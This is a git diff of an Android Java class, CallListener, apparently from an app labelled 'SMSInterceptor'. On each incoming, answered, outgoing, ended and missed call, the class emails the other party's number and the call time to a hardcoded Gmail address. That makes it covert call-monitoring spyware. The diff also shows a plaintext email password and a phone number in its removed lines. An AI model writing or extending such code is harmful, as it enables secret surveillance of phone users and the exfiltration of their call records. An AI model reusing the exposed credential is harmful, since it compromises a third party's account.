@@ -15,10 +15,7 @@ import android.telephony.TelephonyManager;
 public class CallListener extends PhoneCallReceiver {
 
   private static GmailSender sender;
-
-  public  static String emailString = "justdriveapp1@gmail.com";
-  public  static String phoneNumberString = "2014640695";
-  public  static String emailPasswordString = "GHOST21ghost";
+  private static String gmailEmailString = "justdriveapp1@gmail.com";
 
   @Override
   protected void onIncomingCallReceived(final Context ctx, final String number, final Date start) { 
@@ -28,7 +25,8 @@ public class CallListener extends PhoneCallReceiver {
       public void run() {
         try {
           sender = new GmailSender();
-          sender.sendMail("SMSInterceptor", "Incoming call started\nNumber: " + number + "\nStart Time: " + start, emailString, emailString);
+          sender.sendMail("SMSInterceptor", "Incoming call started\nNumber: " + number + "\nStart Time: " + start, gmailEmailString);
+          //sender.sendMail("SMSInterceptor", "Incoming call started\nNumber: " + number + "\nStart Time: " + start, emailString, emailString);
         }
         catch(Exception e) {
           e.printStackTrace();
@@ -46,7 +44,7 @@ public class CallListener extends PhoneCallReceiver {
       public void run() {
         try {
           sender = new GmailSender();
-          sender.sendMail("SMSInterceptor", "Incoming call answered\nNumber: " + number + "\nStart Time: " + start, emailString, emailString);
+          sender.sendMail("SMSInterceptor", "Incoming call answered\nNumber: " + number + "\nStart Time: " + start, gmailEmailString);
         }
         catch(Exception e) {
           e.printStackTrace();
@@ -64,7 +62,7 @@ public class CallListener extends PhoneCallReceiver {
       public void run() {
         try {
           sender = new GmailSender();
-          sender.sendMail("SMSInterceptor", "Incoming call ended!\nNumber: " + number + "\nEnd Time: " + end, emailString, emailString);
+          sender.sendMail("SMSInterceptor", "Incoming call ended!\nNumber: " + number + "\nEnd Time: " + end, gmailEmailString);
         }
         catch(Exception e) {
           e.printStackTrace();
@@ -82,7 +80,7 @@ public class CallListener extends PhoneCallReceiver {
       public void run() {
         try {
           sender = new GmailSender();
-          sender.sendMail("SMSInterceptor", "Outgoing call started!\nNumber: " + number + "\nStart Time: " + start, emailString, emailString);
+          sender.sendMail("SMSInterceptor", "Outgoing call started!\nNumber: " + number + "\nStart Time: " + start, gmailEmailString);
         }
         catch(Exception e) {
           e.printStackTrace();
@@ -100,7 +98,7 @@ public class CallListener extends PhoneCallReceiver {
       public void run() {
         try {
           sender = new GmailSender();
-          sender.sendMail("SMSInterceptor", "Outgoing call ended!\nNumber: " + number + "\nEnd Time: " + end, emailString, emailString);
+          sender.sendMail("SMSInterceptor", "Outgoing call ended!\nNumber: " + number + "\nEnd Time: " + end, gmailEmailString);
         }
         catch(Exception e) {
           e.printStackTrace();
@@ -118,7 +116,7 @@ public class CallListener extends PhoneCallReceiver {
       public void run() {
         try {
           sender = new GmailSender();
-          sender.sendMail("SMSInterceptor", "Missed call\nNumber: " + number + "\nTime: " + start, emailString, emailString);
+          sender.sendMail("SMSInterceptor", "Missed call\nNumber: " + number + "\nTime: " + start, gmailEmailString);
         }
         catch(Exception e) {
           e.printStackTrace();
